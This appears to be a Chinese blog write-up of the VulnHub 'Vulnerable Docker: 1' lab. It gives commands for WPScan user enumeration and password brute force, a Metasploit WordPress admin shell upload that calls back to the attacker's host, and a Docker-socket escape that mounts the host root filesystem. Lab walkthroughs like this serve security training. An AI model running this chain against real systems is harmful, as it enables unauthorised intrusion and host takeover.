---
title: VulnHub Vulnerable Docker：1
date: 2026-04-07 12:31:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - RCE
  - Docker Socket 逃逸
---

# Vulnerable Docker: 1

项目地址：https://download.vulnhub.com/vulnerabledocker/vulnerable_docker_containement.ova

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69d107dd75fc555b73389af6.png)

## 弱口令

### WordPress

访问 8000 端口发现是使用 WordPress 搭建的博客

![](https://pic1.imgdb.cn/item/69d1081475fc555b73389c5e.png)

使用 WPScan 扫描发现 bob 用户

```bash
wpscan --url http://192.168.110.143:8000/ --enumerate u
```

![](https://pic1.imgdb.cn/item/69d10c7d75fc555b7338ebc4.png)

爆破出密码

```bash
$ curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt | wpscan --url http://$ip:8000 --username bob --wordlist -
  [+] [SUCCESS] Login : bob Password : Welcome1                                                                                                         

  Brute Forcing 'bob' Time: 00:00:00 <========                                                                          > (1 / 10) 10.00%  ETA: 00:00:00
  +----+-------+------+----------+
  | Id | Login | Name | Password |
  +----+-------+------+----------+
  |    | bob   |      | Welcome1 |
  +----+-------+------+----------+
```

![](https://pic1.imgdb.cn/item/69d10c7d75fc555b7338ebc4.png)

## RCE

### WordPress

直接使用 MSF Get Shell

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME bob
set PASSWORD Welcome1
set RHOST 192.168.1.107
set RPORT 8000
set LHOST 192.168.1.112   # 你的攻击机IP
set LPORT 4444
run
```

![](https://pic1.imgdb.cn/item/69d10b6c75fc555b7338e677.png)

## 提权

### Docker Socket 逃逸

`/proc/1/cgroup` 文件是 Linux 系统中**进程 1（init 进程）所属的控制组（cgroup）信息**

它的核心作用是展示该进程被资源限制（如 CPU、内存、设备等）划分到了哪个 cgroup 路径中

查看该文件发现是 Docker 容器

![](https://pic1.imgdb.cn/item/69d1123475fc555b73390a62.png)

`/var/run/docker.sock` 是 Docker 守护进程监听的 Unix 套接字

如果容器内部能访问这个文件（通常是因为启动容器时挂载了 `-v /var/run/docker.sock:/var/run/docker.sock`），那么容器内的进程就可以向宿主机 Docker 发送 API 请求

```bash
# 在容器内执行
docker run -it -v /:/host ubuntu bash
```

这条命令会在宿主机上启动一个新容器（因为请求通过 socket 发送给了宿主机的 Docker 守护进程），并且把宿主机的根目录 `/` 挂载到新容器内的 `/host`

由于新容器在宿主机上以 root 运行，攻击者就能访问宿主机的完整文件系统